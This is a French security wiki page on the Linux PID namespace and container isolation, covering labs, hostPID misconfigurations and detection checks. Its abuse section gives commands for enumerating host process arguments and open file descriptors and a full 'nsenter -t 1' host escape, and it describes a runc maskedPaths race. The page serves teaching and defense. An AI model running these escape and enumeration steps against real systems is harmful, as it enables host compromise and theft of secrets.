# Namespace PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Vue d'ensemble

Le namespace PID contrôle la manière dont les processus sont numérotés et les processus qui sont visibles. C'est pourquoi un container peut avoir son propre PID 1 même s'il ne s'agit pas d'une véritable machine. À l'intérieur du namespace, le workload voit ce qui ressemble à un arbre de processus local. À l'extérieur du namespace, l'host voit toujours les véritables PIDs de l'host et l'ensemble des processus présents.

Du point de vue de la sécurité, le namespace PID est important car la visibilité des processus a une grande valeur. Lorsqu'un workload peut voir les processus de l'host, il peut être en mesure d'observer les noms des services, les arguments de la ligne de commande, les secrets transmis dans les arguments des processus, les informations issues de l'environnement via `/proc`, ainsi que les cibles potentielles pour entrer dans un namespace. S'il peut faire davantage que simplement voir ces processus, par exemple en envoyant des signaux ou en utilisant ptrace dans les bonnes conditions, le problème devient beaucoup plus sérieux.

## Fonctionnement

Un nouveau namespace PID commence avec sa propre numérotation interne des processus. Le premier processus créé à l'intérieur devient le PID 1 du point de vue du namespace, ce qui signifie également qu'il reçoit une sémantique spéciale similaire à celle d'init pour les processus enfants orphelins et la gestion des signaux. Cela explique de nombreux comportements particuliers des containers concernant les processus init, la récupération des processus zombies et l'utilisation occasionnelle de petits wrappers init dans les containers.

La leçon importante en matière de sécurité est qu'un processus peut sembler isolé parce qu'il ne voit que son propre arbre de PIDs, mais cette isolation peut être volontairement supprimée. Docker expose cette fonctionnalité via `--pid=host`, tandis que Kubernetes le fait via `hostPID: true`. Une fois que le container rejoint le namespace PID de l'host, le workload voit directement les processus de l'host, et de nombreux chemins d'attaque ultérieurs deviennent beaucoup plus réalistes.

## Lab

Pour créer manuellement un namespace PID :
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Le shell voit désormais une vue privée des processus. L’option `--mount-proc` est importante, car elle monte une instance de procfs correspondant au nouveau PID namespace, ce qui rend la liste des processus cohérente depuis l’intérieur.

Pour comparer le comportement des containers :
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La différence est immédiate et facile à comprendre, ce qui en fait un bon premier lab pour les lecteurs.

## Utilisation du runtime

Les conteneurs normaux dans Docker, Podman, containerd et CRI-O disposent de leur propre namespace PID. Les Pods Kubernetes bénéficient généralement eux aussi d’une vue isolée des PID, sauf si la charge de travail demande explicitement le partage des PID de l’hôte. Les environnements LXC/Incus s’appuient sur la même primitive du kernel, bien que les cas d’utilisation des system-containers puissent exposer des arbres de processus plus complexes et encourager davantage de raccourcis de debugging.

La même règle s’applique partout : si le runtime a choisi de ne pas isoler le namespace PID, il s’agit d’une réduction délibérée de la boundary du conteneur.

## Mauvaises configurations

La mauvaise configuration canonique est le partage des PID de l’hôte. Les équipes le justifient souvent par des besoins de debugging, de monitoring ou de gestion des services, mais cela doit toujours être traité comme une exception de sécurité significative. Même si le conteneur ne dispose d’aucune primitive immédiate d’écriture sur les processus de l’hôte, la simple visibilité peut révéler beaucoup d’informations sur le système. Dès que des capabilities telles que `CAP_SYS_PTRACE` ou un accès utile à procfs sont ajoutés, le risque augmente considérablement.

Une autre erreur consiste à supposer que, puisque la charge de travail ne peut pas tuer ou utiliser ptrace sur les processus de l’hôte par défaut, le partage des PID de l’hôte est donc inoffensif. Cette conclusion ignore la valeur de l’énumération, la disponibilité de cibles pour l’entrée dans les namespaces et la manière dont la visibilité des PID se combine avec d’autres contrôles affaiblis.

## Abus

Si le namespace PID de l’hôte est partagé, un attaquant peut inspecter les processus de l’hôte, collecter les arguments des processus, identifier des services intéressants, trouver des PID candidats pour `nsenter` ou combiner la visibilité des processus avec des privilèges liés à ptrace afin d’interférer avec les workloads de l’hôte ou des workloads voisins. Dans certains cas, le simple fait de voir le bon processus actif suffit à réorienter le reste du plan d’attaque.

La première étape pratique consiste toujours à confirmer que les processus de l’hôte sont réellement visibles :
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Une fois les PID de l’hôte visibles, les arguments des processus et les cibles d’entrée dans les namespaces deviennent souvent la source d’informations la plus utile :
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` est disponible et que les privilèges sont suffisants, vérifiez si un processus hôte visible peut être utilisé comme pont vers un namespace :
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Même lorsque l'accès est bloqué, le partage des PID de l'hôte reste utile, car il révèle l'architecture des services, les composants d'exécution et les processus privilégiés potentiels à cibler ensuite.

La visibilité des PID de l'hôte rend également les abus de descripteurs de fichiers plus réalistes. Si un processus privilégié de l'hôte ou une workload voisine maintient un fichier ou un socket sensible ouvert, l'attaquant peut être en mesure d'inspecter `/proc/<pid>/fd/` et de réutiliser ce descripteur, selon la propriété, les options de montage de procfs et le modèle du service ciblé.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Ces commandes sont utiles, car elles indiquent si `hidepid=1` ou `hidepid=2` réduit la visibilité entre les processus, et si des descripteurs manifestement intéressants, tels que des fichiers secrets ouverts, des logs ou des sockets Unix, sont visibles.

### Exemple complet : host PID + `nsenter`

Le partage des PID de l’hôte devient un host escape direct lorsque le processus dispose également de privilèges suffisants pour rejoindre les namespaces de l’hôte :
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si la commande réussit, le processus du conteneur s’exécute désormais dans les namespaces mount, UTS, network, IPC et PID de l’hôte. L’impact est une compromission immédiate de l’hôte.

Même lorsque `nsenter` est absent, le même résultat peut être obtenu via le binaire de l’hôte si le système de fichiers de l’hôte est monté :
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notes récentes sur le runtime

Certaines attaques pertinentes pour les PID namespaces ne sont pas des mauvaises configurations traditionnelles `hostPID: true`, mais des bugs d’implémentation du runtime liés à la manière dont les protections de procfs sont appliquées lors de la configuration du container.

#### Race de `maskedPaths` vers le procfs de l’hôte

Dans les versions vulnérables de `runc`, les attaquants capables de contrôler l’image du container ou le workload de `runc exec` pouvaient exploiter une race pendant la phase de masquage en remplaçant le `/dev/null` côté container par un symlink vers un chemin procfs sensible, tel que `/proc/sys/kernel/core_pattern`. Si la race réussissait, le bind mount du chemin masqué pouvait cibler la mauvaise destination et exposer au nouveau container des paramètres procfs globaux à l’hôte.

Commande utile pour la revue :
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Cela est important, car l'impact final peut être le même qu'une exposition directe de procfs : `core_pattern` ou `sysrq-trigger` accessible en écriture, suivie de l'exécution de code sur l'hôte ou d'un déni de service.

#### Injection dans un namespace avec `insject`

Les outils d'injection dans les namespaces tels que `insject` montrent que l'interaction avec un PID namespace ne nécessite pas toujours d'entrer dans le namespace cible avant la création du processus. Un helper peut s'y attacher ultérieurement, utiliser `setns()` et s'exécuter tout en conservant la visibilité sur l'espace de PID cible :
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Ce type de technique est principalement utile pour le debugging avancé, les outils offensifs et les workflows de post-exploitation dans lesquels le contexte du namespace doit être rejoint après l'initialisation du workload par le runtime.

### Related FD Abuse Patterns

Deux patterns méritent d'être explicitement mentionnés lorsque les PIDs de l'hôte sont visibles. Premièrement, un processus privilégié peut conserver un file descriptor sensible ouvert après `execve()` parce qu'il n'a pas été marqué `O_CLOEXEC`. Deuxièmement, les services peuvent transmettre des file descriptors via des sockets Unix au moyen de `SCM_RIGHTS`. Dans les deux cas, l'objet intéressant n'est plus le pathname, mais le handle déjà ouvert qu'un processus disposant de moins de privilèges peut hériter ou recevoir.

Cela est important dans le contexte des containers, car le handle peut pointer vers `docker.sock`, un log privilégié, un fichier de secrets de l'hôte ou un autre objet à forte valeur, même lorsque le path lui-même n'est pas directement accessible depuis le filesystem du container.

## Checks

Le but de ces commandes est de déterminer si le processus dispose d'une vue PID privée ou s'il peut déjà énumérer un ensemble de processus beaucoup plus vaste.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Ce qui est intéressant ici :

- Si la liste des processus contient des services évidents de l'hôte, le partage des PID de l'hôte est probablement déjà actif.
- Voir uniquement une petite arborescence locale au conteneur constitue la référence normale ; voir `systemd`, `dockerd` ou des daemons sans rapport ne l'est pas.
- Dès que les PID de l'hôte sont visibles, même les informations en lecture seule sur les processus deviennent utiles pour la reconnaissance.

Si vous découvrez qu'un conteneur s'exécute avec le partage des PID de l'hôte, ne considérez pas cela comme une simple différence cosmétique. Il s'agit d'un changement majeur dans ce que la charge de travail peut observer et potentiellement affecter.
{{#include ../../../../../banners/hacktricks-training.md}}
